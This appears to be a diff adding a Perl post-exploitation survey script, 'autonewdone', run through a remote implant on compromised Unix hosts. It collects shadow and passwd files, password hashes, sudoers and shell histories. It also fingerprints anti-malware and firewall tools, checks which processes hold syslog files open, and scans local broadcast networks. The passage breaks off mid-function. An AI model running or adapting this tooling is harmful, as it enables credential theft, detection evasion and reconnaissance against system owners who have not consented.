@@ -1,0 +1,926 @@
+#!/usr/bin/env perl
+#
+# 20090406 - This version of autodone is far simpler and massively
+# different than its predecessor. The previous one was a collected
+# mishmash of varying levels of coder skill, automation and other
+# stuff, thrown together into a single blob. This version of autodone
+# is just the portion that surveys the system and generates the hostinfo*
+# files.
+#
+$VER="2.0.2.22" ;
+$ext = $$ ;			# limits likelihood of concurrent autodone's colliding
+				# BUT: still possible.
+				# not too likely to happen.
+
+$| = 1;
+myinit() ;
+# promptkill puts itself into /usr/local/bin if none or an older one is there
+# so this makes sure /usr/local/bin is current even if promptkill does not get
+# used this op
+`$opbin/promptkill -v` if (-x "$opbin/promptkill");
+
+# following is first time autonext is used without $$ extension--fewer collisions?
+# In case this is there from previous run, we save it as .NNNN
+preservefile("$opdown/hostinfo.$nopen_rhostname") unless $autonohostinfo;
+
+my @autoargv = ();
+if ((-e "$optmp/autonewdone.$nopen_rhostname" or -e "$optmp/autodont") and
+    (!$redo and !$autonohostinfo)) {
+  myalert("autonewdone has already completed on this target. Use -gs auto FORCE [SHORT] $gsoptions to re-do it.");
+} else {
+  dosurvey();
+}
+
+# End with true value as we require this script elsewhere.
+1;
+
+sub dosurvey {
+    # Set these files aside as .old if they exist
+    preservefile ("$opdown/rpcinfo.$nopen_rhostname",
+		  "$opdown/ls_etc-ct.$nopen_rhostname",
+		  );
+    
+    # Are we on a first hop?
+    ($output,$nopenlines,@firsthops) = doit("-lsh didthis | grep noclient | grepip");
+    my $firstin = 0;
+    foreach my $ip (@firsthops) {
+	$firstin++ if $ip eq $nopen_myip;
+	last if $firstin;
+    }
+    
+    myalert("NOLOGGING","BEGIN running $opetc/autonewdone on $nopen_rhostname output in $nopen_mylog (v.$VER)");
+    system("touch $optmp/autonewdone.INPROGRESS.$targetpid");
+    
+    # Write out the nopen_auto.$nopen_mypid file that yells if we didn't finish a run.
+    open(YELLPROMPT, "> $optmp/.gsyell.$nopen_rhostname.$nopen_mypid") or myalert("Can't create warning text! $!");
+    print YELLPROMPT "${COLOR_FAILURE}\n".
+	"WARNING: AUTONEWDONE IS NOT FINISHED! WARN SOMEONE!${COLOR_NORMAL}\n\n\n".
+	"This should not happen. Please report this now\n".
+	"(yes, now...in person...go....shoo!).\n\n".
+	"You can hit return here to get your window back, though.\n\n";
+    print YELLPROMPT "${COLOR_FAILURE}\n".
+	"WARNING: AUTONEWDONE IS NOT FINISHED! WARN SOMEONE!${COLOR_NORMAL}\n\n\n";
+    close(YELLPROMPT);
+    open(GSYELL, "> $opetc/nopen_auto.$nopen_mypid") or myalert("Can't create warning script! $!");
+    print GSYELL "#NOGS\n";
+    print GSYELL "-lsh -nohist rm -f $optmp/.gsyell.out.$nopen_mypid\n";
+    print GSYELL "-lsh -nohist test -f $optmp/autonewdone.$nopen_rhostname || ".
+	"$opetc/autogetinput -O $optmp/.gsyell.out.$nopen_mypid -P $optmp/.gsyell.$nopen_rhostname.$nopen_mypid\n";
+    print GSYELL "-lsh -nohist rm -f $optmp/.gsyell.$nopen_rhostname.$nopen_mypid\n";
+    print GSYELL "-lsh -nohist rm -f $optmp/autonewdone.INPROGRESS.$targetpid\n";
+    close(GSYELL);
+    
+    # Begin running the actual autonewdone commands.
+    doit("-lsh date -u");
+    mydo("autodoproject");
+    doitwrite("\\hostname",
+	      "more /etc/hostname* ; echo",
+	      "domainname",
+	      "cat /etc/syslog.conf ; echo",
+	      );
+    preservefile("$optmp/.syslog.$nopen_rhostname");
+    doit("-lsh grep -v \\\"^#\\\" $optargetcommands/${nopen_rhostname}_cat__etc_syslog.conf >> T:$optmp/.syslog.$nopen_rhostname");
+    
+    # New 20060426: We look in 
+    my $hackdirs = "@hackdirs";
+    $hackdirs =~ s/ /,/g;
+    my $extrapscheckarg = "-D" ;
+    if ($nopen_serverinfo =~ /linux/i) {
+	$extrapscheckarg = "-s" ;	# no sorting needed for linux
+    }
+    $hackdirs = "";
+    dbg("hackdirs=(@hackdirs)");
+    @autoargv = ($extrapscheckarg);
+    foreach (@hackdirs) {
+	next unless length $_;
+	push(@autoargv,$_);
+	$hackdirs .= " $_/*";
+    }
+    dbg("hackdirs=$hackdirs");
+    if (!$freebsdtarget and (!(-e "$optmp/hacksums.$nopen_rhostname"))) {
+	doit("-ls -n -R /bin/ps /bin/netstat $hackdirs >> T:$optmp/hacksums.$nopen_rhostname",
+	     "-ls -u -R /bin/ps /bin/netstat $hackdirs >> T:$optmp/hacksums.$nopen_rhostname",
+	     "-sha1sum /bin/ps /bin/netstat $hackdirs >> T:$optmp/hacksums.$nopen_rhostname",
+	     );
+    } else {
+	# Just do /bin/ps and /bin/netstat, and don't save them...
+	unless ($freebsdtarget || $darwintarget) { 
+	    doit("-ls -n /bin/ps /bin/netstat",
+		 "-ls -u /bin/ps /bin/netstat",
+		 "-sha1sum /bin/ps /bin/netstat",
+		 );
+	} elsif ($freebsdtarget) {
+	    doit("-ls -n /bin/ps /usr/bin/netstat",
+		 "-ls -u /bin/ps /usr/bin/netstat",
+		 "-sha1sum /bin/ps /usr/bin/netstat",
+		 );
+	} elsif ($darwintarget) {
+	    doit("-ls -n /bin/ps /usr/sbin/netstat",
+		 "-ls -u /bin/ps /usr/sbin/netstat",
+		 "-sha1sum /bin/ps /usr/sbin/netstat",
+		 );
+	}      
+    }
+    
+#  # Check for the existence of the libX.a rootkit and the rps and netstat binaries.
+#  if ($solaristarget) {
+#    my ($libXoutput,$nopenlines,@libXoutput) =
+#      nopenlss("-UF","-g .*/rps\$\|.*/netstat\$","/usr/lib/libX.a/bin");
+#    my ($foundrps) = grep m, /.*/rps$, , $libXoutput;
+#    my ($foundnetstat) = grep m, /.*/netstat$, , $libXoutput;
+#    if ($libXoutput && ($foundrps || $foundnetstat)) {
+#      myalert("The libX.a rootkit is present!! ".
+#              "Reconfiguring this (and future) NOPEN session(s) to use undorked binaries");
+#      $allwindows = 1;
+#      nopenaddpath("/usr/lib/libX.a/bin");
+#      nopenaddalias("=ps","rps -ef",0);
+    
+#      # Reinitialize our session and reset the pscommand file, if it exists.
+#      mydo("autosessioninit","reinit");
+#      if ( -e "$optmp/pscommand.$nopen_rhostname") {
+#        unlink("$optmp/pscommand.$nopen_rhostname");
+#      }
+#    }
+#  }
+
+  
+#  doit("=autorpc > L:$opdown/rpcinfo.$nopen_rhostname");
+#  my ($output) = doit("=autorpc");
+#  writefile("$opdown/scan_brpc_$nopen_rhostname",$output);
+
+
+
+    my (undef,$netstatfile) = doitwrite("ARRAY","netstat -an","netstat -rn");
+
+    if ($aixtarget) {
+	logdoit("netstat -in");
+    }
+
+    # TODO: Parse this rpcinfo output in $rpcoutputfile, make a new copy like
+    # how -scan rpc looks (more detail)
+    my (undef,$rpcoutputfile) = doitwrite("ARRAY","rpcinfo -p");
+
+# TODO: Could not get to work, why not?
+#  offerabort("DBG:WTF");
+#  if ($solaristarget or $linuxtarget) {
+#      mydo("autopscolor","-pt");
+#      sleep 3;
+#  offerabort("DBG:WTF DONE");
+#  }
+
+    
+    mydo("autopscheck","autodone");
+    
+    tickleifneedbe($builtinsonly);
+    
+    # Symantec Critical System Protection (SCSP)
+    # On Windows/AIX/Linux/Solaris
+    # NOTE: Other collects in autonewdone done this way with a recursive
+    # listing of /etc/ will reuse this listing, saving a bit of target time.
+    # But be sure you use "/etc/" and not "/etc", which will be re-listed.
+    # cxs: Config Exploit Scanner (see also autopscheck)
+    # lfd: linux firewall daemon
+    # csf: ConfigServer firewall
+  
+    my ($sec,$min,$hr,$mday,$mon,$year,$wday,$yday,$isdst) = gmtime();
+    $year += 1900 unless $year > 1900;
+    # $mon is zero based, $mon-1 is 60 days worth
+    my $xmtime = sprintf("%02d-%02d-%02d",$mon-2,$mday,$year);
+    ($newdoneoutput,$nopenlines,@newdoneoutput) =
+	nopenlss("-RG${nopenlssreget}YUFM100000",
+		 "-btail",
+		 "-gsisips,,grub.conf,,lfd,,csf,,cxs,,hostname,,nsswitch.conf",
+		 #"-gsisips,,grub.conf,,lfd,,csf,,cxs,,hostname,,nsswitch.conf,,motd,,syslog.*conf,,inetd.conf,,resolv.conf",
+		 "-xm",$xmtime,
+		 "/etc",
+		 "/var/log",
+		 "/var/adm",
+		 );
+    # More gets, grepping same listing returned in above (no -U here, so not re-listed)
+
+    ($newdoneoutput,$nopenlines,@newdoneoutput) =
+	nopenlss("-RG${nopenlssreget}YFM100000",
+		 "-btail",
+                 "-gshadow,,passwd,,hosts,,motd,,syslog.*conf,,inetd.conf,,resolv,conf,,selinux/config,,release,,redhat,,debian,,issue,,slack.*version,,spwd.db,,sudoers,,/ssh,,lfd.log,,security/audit_control",
+		 "/etc",
+		 "/private/etc", # MacOS
+		 "/var/log",
+		 "/var/adm",
+		 );
+
+
+    ($newdoneoutput,$nopenlines,@newdoneoutput) =
+        nopenlss("-RG${nopenlssreget}YFM300000",
+		 "-ghttpd.conf",
+                 "/usr/local/apache/conf/",
+                 );
+
+    
+    tickleifneedbe($builtinsonly);
+    
+    #($newdoneoutput,$nopenlines,@newdoneoutput) =
+	#nopenlss("-btail","-RG${nopenlssreget}YUFM1000000",
+	#	 "/var/*/lfd.log*",
+	#	 );
+    
+    
+    # MALDETECT: running as lmd or maldet
+    ($output) = doit("-ls -d /usr/local/maldetect* /usr/local/maldetect/VERSION*");
+    ($output) = doit("-ls -d /opt/maldetect* /opt/maldetect/VERSION*") unless $output;
+    if ($output) {
+	($newdoneoutput,$nopenlines,@newdoneoutput) =
+	    nopenlss("-RG${nopenlssreget}YUFM100000","-gignore,,conf,,event_log,,VERSION",
+		     "/usr/local/maldetect*","/opt/maldetect*",
+		     );
+    }
+
+#  ($output) = doit("-ls -d /etc/*cxs* /etc/*lfd* /etc/*csf* /var/log/*cxs* /var/log/*csf*");
+#  ($output) = doit("-ls -d /var/log/*cxs* /var/log/*csf*");
+#  if ($output) {
+#      ($newdoneoutput,$nopenlines,@newdoneoutput) =
+#	  nopenlss("-RG${nopenlssreget}YUFM100000",
+#		   #Never mind the -g matches, gank it all
+#		   "-gconf,,cfg,,ini",
+#		   "/etc/*cxs*",
+#		   "/var/log/*cxs*log",
+#		   "/etc/*lfd*",
+#		   "/etc/*csf*",
+#		   );
+#  }
+#    
+    
+  # So much simpler!
+#  ($newdoneoutput,$nopenlines,@newdoneoutput) =
+#    nopenlss("-GR${nopenlssreget}YUFM100000","-gshadow",
+#	     "/etc/tcb/",
+#	     );
+    
+    ($newdoneoutput,$nopenlines,@newdoneoutput) =
+	nopenlss("-G${nopenlssreget}YUFM100000",
+		 "/usr/local/cpanel/version",
+		 # /etc stuff now got on recursive /etc nopenlss above (at about line 178==26%)
+		 #"/etc/nsswitch.conf",
+		 #"/etc/hostname",
+		 #"/etc/hosts*",
+		 #"/etc/motd*",
+		 #"/etc/inet/hosts*",
+		 #"/etc/syslog.conf",
+		 #"/etc/inetd.conf",
+		 #"/etc/inet/inetd.conf",
+		 #"/etc/resolv.conf",
+		 #"/etc/passwd*",
+		 #"/etc/shadow*",
+		 #"/etc/master.passwd*",
+		 #"/etc/security/passwd*",
+		 #"/root/.*history",
+		 "/.*history",
+		 "/export/.*history*",
+		 );
+    
+    ($newdoneoutput,$nopenlines,@newdoneoutput) =
+	nopenlss("-G${nopenlssreget}YUFM100000",
+#  nopengetfiles("SIZEMAX=5000 GETZERO=1",
+		 #"/etc/selinux/config",
+		 #"/etc/*release*",
+		 #"/etc/*redhat*",
+		 #"/etc/*debian*",
+		 "/usr/lib/setup/*slack*version*",
+		 #"/etc/*slack*version*",
+		 #"/etc/*issue*",
+		 ) unless ($freebsdtarget);
+	       
+  
+    
+    # NEW: Grab platform specific stuff
+    if ($freebsdtarget) {
+	# FreeBSD-specific. This stinks, until bugs are fixed.
+	($newdoneoutput,$nopenlines,@newdoneoutput) =
+	    nopenlss("-G${nopenlssreget}YUFM100000",
+		     #"/etc/spwd.db*",  # passwd hashes
+		     "/var/etc/hosts",
+		     );
+    } elsif ($darwintarget) {
+	($newdoneoutput,$nopenlines,@newdoneoutput) =
+	    nopenlss("-G${nopenlssreget}YUFM100000",
+#    nopengetfiles("SIZEMAX=100000 GETZERO=1",
+		     "/Users/*/.*history*",
+		     "/var/root/.*history*",
+		# These are for MacOS/Darwin:
+                     "/private/var/db/shadow/*",
+                     "/var/db/shadow/*",
+		     );
+    } elsif ($hpuxtarget) {
+	# Password crypts
+	nopenlss("-G${nopenlssreget}YUFM10000",
+		 "/tcb/files/auth",
+		 );
+	doitwrite(
+		  "swlist",
+		  "/usr/contrib/bin/machinfo",  # Not on all HPUX thats ok
+		  "model",
+		  "getconf _CS_MACHINE_IDENT",
+		  ) unless ($builtinsonly);
+    }
+    
+    # This code replaces autogettail.
+    my @getthese = ("/var/adm/sulog",
+		    "/var/log/sulog",
+		    #"/etc/*sudoers*",
+		    
+		    );
+    push(@getthese,"/var/adm/syslog.dated/current/auth.log") if ($nopen_serverinfo =~ /osf/);
+    ($newdoneoutput,$nopenlines,@newdoneoutput) =
+#    nopengetfiles("SIZEMAX=16384 GETZERO=1 TAILBYTES",
+	nopenlss("-btail","-G${nopenlssreget}YUFM16384",
+		 @getthese,
+		 );
+#    doit("-lsh rm -f `find $opdown/$nopen_rhostname -name \\\"*.tail\\\" -o -name \\\"*.tail.[0-9]*\\\" -empty -print`");
+#    @autoargv = ("/var/adm/sulog","/var/log/sulog");
+#    push(@autoargv,"$moreauthlogs") if defined $moreauthlogs;
+#    foreach $file (@autoargv) {
+#      doit("-tail -nohist -200 $file");
+#    }
+#    @autoargv = ();
+    
+    # Set up to collect .netrc files.
+    #my ($userlist,@userdirs) = parseuserdirs($nopen_rhostname,2000,"autonewdone");
+    #@getfiles = ();
+    #my $maxsize = 32768;
+    #foreach my $dir (@userdirs) {
+    #  push(@getfiles,
+#	 "$dir/.netrc",
+#	);
+    #} 
+    #nopengetfiles("SIZEMAX=$maxsize GETZERO=1", @getfiles);
+    
+    doit("-getenv",
+	 );
+    doitwrite(
+	      "=locale",
+	      );
+    
+    doitwrite("cat /etc/coreadm.conf ; echo") unless !($solaristarget);
+    # The Solaris one is in the autodothis section below.
+    doitwrite("=procinfo") unless ($freebsdtarget or $solaristarget);
+    
+    mydo("autodfcheck","autodone");
+    
+    my $datez = "%z";
+    $datez = "%Z" if $solaristarget;
+    
+    my ($output) = doit("date \"+%a, %d %b %Y %H:%M:%S $datez\"");
+    writefile("$opdown/date-rfc2822.$nopen_rhostname",$output);
+    
+    # Run the autodothis stuff in here.
+    my $statsfile = "$opdown/${targetplatform}stats.cmdout.$nopen_rhostname";
+    preservefile($statsfile);
+    open(CMDOUT,">$statsfile");
+    
+    unless ($solaristarget) {
+	logdoit("mount",
+		"cat /proc/mounts");
+    }
+    if ($solaristarget) {
+	my $zfssnapshot = 0;
+        ($output) = doit("-ls /.zfs/snapshot");
+#    if ($zfssnapshot) {
+#        $zfssnapshot =~ s,([\r\n]),$1Tool Comments: ,g ;
+#        $toolcomment .= " ZFS snapshot exists:\nTool Comments: $zfssnapshot";
+#    }
+
+	
+	logdoit(
+		#"prtvtoc `df -lk /|tail -1|awk '{print \$1}'`",
+#	 "df -lk /|tail -1|cut -d' ' -f1",
+		"-ls -R /var/crash",
+		);
+	# Only run these commands if we are on an INCISION host, based
+	# on the hidden directory matching either INCISION directory.
+	if ($host_hiddendir =~ /^\/platform\/.*/) {
+	    unless ($host_hiddendir and $hiddendir_viastoic) {
+		mydo("autoorcheck","-i");
+		mydo("autopccheck","-i");
+	    }
+	}
+	
+	logdoit("iostat -E",
+		"vmstat",
+		"=procinfo",
+		"psrinfo -vp",
+		"isalist",
+		);
+	($newdoneoutput,$nopenlines,@newdoneoutput) =
+	    nopenlss("-RG${nopenlssreget}YFM100000",
+		     "-btail",
+		     "-g/etc/ipf,,/etc/*/ipf,,/etc/zones,,/etc/system,,/etc/logadm.conf",
+		     "/etc",
+		     "/var/log",
+		     "/var/adm",
+		     );
+#	my ($loc1,$loc2) = gotlocalcopy("/etc/system");
+#	foreach my $loc ($loc1,$loc2) {
+#	    next if  ($doneloc{$loc}++);
+#	    if (-s $loc) {
+#                doit("-lsh cat $loc | egrep -v \"^\$|^\*\"");
+#	    }
+#	}
+#	($loc1,$loc2) = gotlocalcopy("/etc/logadm.conf");
+#	foreach my $loc ($loc1,$loc2) {
+#	    next if  ($doneloc{$loc}++);
+#	    if (-s $loc) {
+#                doit("-lsh cat $loc | egrep -v \"^\$|^\#\"");
+#	    }
+#	}
+
+
+	my $justgot = `cd $opdown/$nopen_rhostname ; ls -alrtR etc/system* etc/logadm.conf* etc/ipf* etc/zones* 2>/dev/null`;
+	print CMDOUT "\n\nJust downloaded the following:\n\n$justgot\n"
+	    if ($justgot);
+
+    } elsif ($darwintarget) {
+	my %diskutilsdone = ();
+	foreach my $line (readfile("ARRAY","$optargetcommands/mount*")) {
+	    my ($subdisk,$disk) = $line =~ m,^\s*((/dev/disk\d+)\S+\d+),;
+	    logdoit("diskutil info $subdisk") if ($subdisk and not $diskutilsdone{$subdisk}++);
+	    logdoit("diskutil info $subdisk") if ($disk and not $diskutilsdone{$disk}++);
+	}
+    } elsif ($linuxtarget) {
+	logdoit(
+		"lspci -vvvv",
+		"lsusb",
+#         "more /proc/iomem /proc/pci /proc/ioports /proc/bus/usb/devices /proc/scsi/scsi /proc/meminfo /proc/cpuinfo /proc/version",
+		"more /proc/iomem /proc/pci /proc/ioports /proc/scsi/scsi /proc/meminfo /proc/cpuinfo /proc/version",
+		);
+	
+    } elsif ($freebsdtarget) {
+	logdoit(
+		"df -k",
+		);
+    }
+    close(CMDOUT);
+
+
+    my ($allprocs,undef,@allprocs) = doit("=ps");
+    my @uidlines = grep /root\s.*ps\s/ , @allprocs;
+    my $uid = -1;
+    while (1) {
+        if (@uidlines == 1) {
+	    $uid = 0 if ($uidlines[0] =~ /root\s.*ps\s/);
+	    last;
+        } else {
+	    last if $uid == 1;
+	    progprint($COLOR_FAILURE."\n\n\n\a".
+		"This is odd:  We have either NO ps lines or MORE THAN ONE:\n\n".
+		join("\n",@uidlines)."\n\nTrying again....");
+	    # Try =ps again just to be sure 
+	    $uid = 1;
+	    ($allprocs,undef,@allprocs) = doit("=ps");
+	    @uidlines = grep /root\s.*ps\s/ , @allprocs;
+	    next;
+	}
+    }
+    # This stuff only do if we are root
+    if ($uid == 0) {
+        if ($solaristarget) {
+            my @pfilepids = ();
+
+            my (undef,undef,@inodeoutput) = doit("-ls -di /proc/*/fd/*");
+            my ($openfilesoutput,$badprocs) = ();
+            my @checklogfiles = ("/var/adm/messages","/var/log/syslog");
+            foreach my $logfile (@checklogfiles) {
+                my ($inode) = doit("-ls -i $logfile");
+                ($inode) = $inode =~ /^\s*(\d+)\s/;
+	            
+	        
+                if (my @greppedinodeoutput = grep /^\s*$inode\s/ , @inodeoutput) {
+	        	
+		    my @pids = ();
+		    foreach (@greppedinodeoutput) {
+		        push (@pids,$1) if (m,proc/(\d+)/, and $1 > 1);
+		    }
+		    @pfilepids = uniqify_array(@pids,@pfilepids);
+		    my $pids = join("|",@pids);
+		    next unless $pids;
+		    my ($logprocs,undef,@logprocs) = doit("=ps | egrep \" ($pids) \"");
+		    $openfilesoutput .= $COLOR_NOTE.
+		       "\n=============================================================\n".
+		       $COLOR_NORMAL.
+		       "NOTE: These /proc/ entries:\n\n".
+		       join("  \n",@greppedinodeoutput)."\n\n".
+		       "indicate that these processes have $logfile open:\n\n".
+		       $logprocs;
+		    $badprocs++ if (grep ! /(syslog|syslogd)$/ , @logprocs);
+                }
+            }
+            doit("pfiles @pfilepids");
+            if ($openfilesoutput) {
+	        progprint($openfilesoutput."\n\n".
+		    "See above for output from \"pfiles @pfilepids\".".
+		    "");
+	        if ($badprocs) {
+		    if ($nopromptsplease) {
+		      progprint ($COLOR_FAILURE."\n\n".
+		         "NOTE: There is a process other than syslog or syslogd that has one\n".
+		         "of these files open, SEE ABOVE then continue autonewdone:\n\n   ".
+		         join("\n   ",@checklogfiles)."\n\n".
+		         "PAUSING 5 SECONDS ONLY NO PROMPT...".
+		         "");
+		      sleep 5;
+		    } else {
+		      mygetinput ($COLOR_FAILURE."\n\n".
+		         "NOTE: There is a process other than syslog or syslogd that has one\n".
+		         "of these files open, SEE ABOVE then continue autonewdone:\n\n   ".
+		         join("\n   ",@checklogfiles)."\n\n".
+		         "Hit Return to continue...".
+		         "");
+		    }
+	        } else {
+		    sleep 5;
+	        }
+            }
+        } elsif ($linuxtarget) {
+        }
+        # For this /proc/*/maps we look everywhere, process it where it exists
+	my ($mapsoutput,$mapsoutputfile) = doitwrite("ARRAY","more /proc/[0-9]*/maps");
+	my @mapsoutput = readfile("ARRAY",$mapsoutputfile);
+	if (@mapsoutput > 3) {
+	    my ($gdmoutput,undef,@gdmoutput) = doit("-ls /tmp/.gdm-*");
+	    my @mapsbadhits = grep m,libc[sm][12].so, , @mapsoutput;
+	    if (@mapsbadhits) {
+                my $gdmmore = $gdmoutput ? "$COLOR_FAILURE   AND THESE ARE LIKELY RELATED ALSO:$COLOR_NORMAL\n\n     ".
+		    join("\n     ",@gdmoutput)."\n\n" : "" ;
+		offerabort($COLOR_FAILURE."\n\n   WARNING: $COLOR_NOTE SIG04$COLOR_FAILURE HITS IN /proc/*/maps\n\n$COLOR_NORMAL".
+			   `ls -al $mapsoutputfile`."\n\n".
+                           $gdmmore.
+			   "ALERT: The output in the above local file matches the alert string:\n".
+			   "   /libc[sm][12].so/\n\n".
+			   "You can likely CONTINUE but should take note of this and\n".
+			   "perhaps also alert others about it. File above just popped up, FYI. Search for hits with:\n\n".
+			   "     /libc[sm][12].so\n".
+			   "     ?:::::\n".
+			   "     ?.proc.*".
+			   "\n",
+			   "CONTINUE");
+		filepopup($mapsoutputfile,"-bg white -fg red -geometry 152x48");
+    
+            }
+	} else {
+            unlink($mapsoutputfile);
+	}
+    }
+    
+    if (-f "$opetc/gs.autodothis.$nopen_rhostname") {
+      `dos2unix $opetc/gs.autodothis.$nopen_rhostname 2>&1`;
+      doit("-gs autodothis.$nopen_rhostname");
+    }
+    
+    
+    tickleifneedbe($builtinsonly);
+    
+    # Run the old gs.idscript stuff in here.
+    preservefile("$opdown/script.ids$nopen_rhostname");
+    open(CMDOUT,">$opdown/script.ids$nopen_rhostname");
+    logdoit
+	(
+	 "-ls /bin /usr /usr/sbin /usr/local",
+	 );
+    if($darwintarget) {
+	logdoit("-ls /private/etc",
+		"sw_vers",
+		);
+    } else {
+	logdoit("-ls /etc /usr/local/etc");
+    }
+    logdoit(
+	    "-ls /var/yp",
+	    "-ls /etc/bind* /etc/named* /etc/*ndc* /usr/local/etc/named*",
+	    "-ls /var/named* /var/run/named*",
+	    );
+    close(CMDOUT);
+    
+    my $morehost = "";
+    unless ($optargetcommands =~ /$nopen_rhostname/) {
+	$morehost = "*$nopen_rhostname";
+    }
+    `more $optargetcommands/ps$morehost* >> $opdown/script.ids$nopen_rhostname`;
+    `more $optargetcommands/netstat$morehost* >> $opdown/script.ids$nopen_rhostname`;
+    `more $optargetcommands/df$morehost* >> $opdown/script.ids$nopen_rhostname`;
+    
+    unless ($builtinsonly) {
+	preservefile("$opdown/iptables.$nopen_rhostname",
+		     "$opdown/dmesg.$nopen_rhostname",
+		     "$opdown/ipfstat.$nopen_rhostname",
+		     "$opdown/modinfo.$nopen_rhostname",
+		     "$opdown/lsmod.$nopen_rhostname",
+		     "$opdown/selinux.$nopen_rhostname",
+		     );
+	
+	my (undef,$dmesgfile) = doitwrite("ARRAY","dmesg;echo",
+					  );
+	doit(
+	     "egrep -i \"memory|mem = \" /var/log/messages /var/adm/messages /var/log/syslog /var/adm/syslog 2>/dev/null | tail -30 >> T:$dmesgfile",
+	     );
+	
+	if ($solaristarget) {
+	    my ($results,$testfile) =
+		logdoit("modinfo");
+	    logdoit("ipfstat -ionv")
+		if ($results =~ /ipf/); # CONDITIONAL, only does ipfstat if ipf appears in modinfo
+	} elsif ($freebsdtarget) {
+	    logdoit(
+		    "kldstat",
+		    "sysctl -a ; echo",
+		    );
+	} elsif ($linuxtarget) {
+	    #logdoit(
+	    #	"sysctl -a ; echo",
+	    #	)
+	    #    unless ($linuxkernel =~ /^3\.2/);
+	    logdoit("lsmod");
+            mypydo(0,"autoiptableslist", "-l");
+	    
+	    # modules to look for
+	    my %modulestrings = ("kav","Kaspersky Anti-Virus");
+	    foreach my $modulekey (sort keys %modulestrings) {
+		if ($results =~ /$key/) {
+		    # TODO: Add logic like pscheck here to popup with alerts
+		}
+	    }
+
+
+	    nopenlss("-G${nopenlssreget}YUFM150000","/etc/selinux/config");
+	    `grep -v "^\#" $opdown/$nopen_rhostname/etc/selinux/config > $optargetcommands/${nopen_rhostname}_selinux 2>/dev/null`;
+	    unlink("$optargetcommands/${nopen_rhostname}_selinux")
+		unless -s("$optargetcommands/${nopen_rhostname}_selinux");
+	    
+	    #chomp($test = `grep "SELINUX=enforcing" $opdown/selinux.$nopen_rhostname 2>/dev/null`);
+	    #chomp($test = `grep "SELINUX=permissive" $opdown/selinux.$nopen_rhostname 2>/dev/null`);
+	    # TODO: Pop this up as warning if its there??? not
+	}
+	
+	unlink("$opdown/iptables.$nopen_rhostname")
+	    unless (-s "$opdown/iptables.$nopen_rhostname");
+	`grep "lsmod.*no such " $opdown/iptables.$nopen_rhostname && /bin/rm $opdown/iptables.$nopen_rhostname`;
+	`grep "lsmod.*not found" $opdown/iptables.$nopen_rhostname && /bin/rm $opdown/iptables.$nopen_rhostname`;
+	
+	unlink("$opdown/ipfstat.$nopen_rhostname")
+	    unless (-s "$opdown/ipfstat.$nopen_rhostname");
+	`grep "ipfstat.*no such " $opdown/ipfstat.$nopen_rhostname && /bin/rm $opdown/ipfstat.$nopen_rhostname`;
+	`grep "ipfstat.*not found" $opdown/ipfstat.$nopen_rhostname && /bin/rm $opdown/ipfstat.$nopen_rhostname`;
+    }
+    
+    tickleifneedbe($builtinsonly);
+    
+    # Use replay to add some more to $statsfile
+    doit(
+	 "-gs replay -Hf $statsfile ps",
+	 "-gs replay -Hf $statsfile df -",
+	 );
+    
+    
+
+    logdoit("hostid","who -r");
+    
+    # Instead of blindly running ssh, check for it first.
+    ($sshoutput,$nopenlines,@sshoutput) = nopenlss("-UFP","ssh*");
+    my $path = "";
+    if ($sshoutput[-1]) {
+	# We got at least one filename.
+	foreach $filelisting (@sshoutput) {
+	    # Get the path to each ssh binary, then run it inidividually.
+	    # This will let us check the versions of multiple ssh binaries
+	    # on the target, if so installed.
+	    ($path) = grep m, /.*/ssh\S?$, , $filelisting;
+	    $path = $1 if $path =~ /-.*\s(\/.*\/ssh\S?)$/;
+	    doitwrite("$path -V") if $path;
+	}
+    } else {
+	myalert("NOLOGGING","No SSH binaries found, skipping ssh -V command");
+    }
+    
+    doit("=mkoffset");
+    mydo("autocroncheck","-F");
+    
+    @autoargv = ();
+    push(@autoargv,"-P") if $firstin;
+    
+    
+    mydo("autoarp",@autoargv);
+    
+    
+    # TODO: Add XEN VM* checks here instead of in autoarp
+    
+    
+    # We scan broadcasts, only on initial hops, and only on the 20th every month.
+    # Force this off via touch /current/tmp/SKIPBCSCANS 
+    # Force this on via  touch  current/tmp/FORCEBCSCANS
+    # @currentconns becomes the established sessions from $nopen_myip to our
+    # current externalIP.
+    my @currentconns = grep /$gbl_externalIP{"current"}/,
+    readfile("ARRAY","$optargetcommands/netstat*$nopen_rhostname*");
+    @currentconns = grep /$nopen_myip/,@currentconns
+  	if ($nopen_myip and $opdown eq $optargetcommands);
+    dbg("
+builtinsonly=$builtinsonly=
+calledviacommandline=$calledviacommandline=
+".`ls -arlt $optmp/*SCANS*`."
+
+");
+    if (!$builtinsonly and @currentconns > 0 and
+   	! -f  "$optmp/SKIPBCSCANS" and
+  	(timestamp("short") =~ /20-/ or -f "$optmp/FORCEBCSCANS")) {
+  	my %scanned = ();
+  	my @ifconfig = readfile("ARRAY",
+                                "$opdown/ifconfig*${nopen_rhostname}*",
+				);
+  	@ifconfig    = readfile("ARRAY",
+                                "$optargetcommands/ifconfig*${nopen_rhostname}*",
+				)
+	    unless (@ifconfig);
+	doit("w");
+	foreach my $line (@ifconfig) {
+	    my ($bc) = $line =~ /broadcast (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/;
+	    if ($bc and !$scanned{$bc}++) {
+		doit("-scan xwin $bc","w");
+		doit("-scan brpc $bc","w");
+	    }
+	}
+    }
+    
+    
+    doit("-ls -ct /etc > L:$opdown/ls_etc-ct.$nopen_rhostname");
+    
+    $output = doitwrite("uname -a");
+    if ($aixtarget) {
+	logdoit("prtconf",);
+	$output .= "\n" . logdoit("uname -M",);
+    } elsif ($solaristarget) {
+	logdoit(
+		"echo :::isainfo -bv::: ; isainfo -bv ; echo :::isainfo -kv::: ; isainfo -kv ; echo :::isainfo -nv::: ; isainfo -nv",
+		"eeprom",
+		);
+	if ($solaristargetversion =~ /^2\.11/) {
+	    my $pkginfo = doitwrite("pkg info kernel");
+	    # TODO: Set a variable for this, the uname variable no longer useful for kernel level detection in 2.11+.
+	} elsif ($solaristargetversion =~ /^2\.(8|9|10|11)/) {
+	    logdoit(
+		    "prtconf -pv",
+		    );
+	} else {
+	    logdoit(
+		    "prtconf -V",
+		    );
+	}
+    }
+    newhostvar("host_uname{$nopen_rhostname}",$output)
+	if ($output) ;
+    
+    mydo("autochecklast");
+
+    # This is worth alerting on: SCALDWED
+    # Auto -ls, then pull, 384 byte files matching this in /var/tmp:
+    ($newdoneoutput,$nopenlines,@newdoneoutput) =
+        nopenlss("-rGYLNOSEND/var/tmp",
+		 "-Um384","-M384","-g/var/tmp/\\.......\$",
+                 "/var/tmp");
+    if ($newdoneoutput) {
+	$newdoneoutput =~ s,\033\[[0-9]+;[0-9]+m,,g;
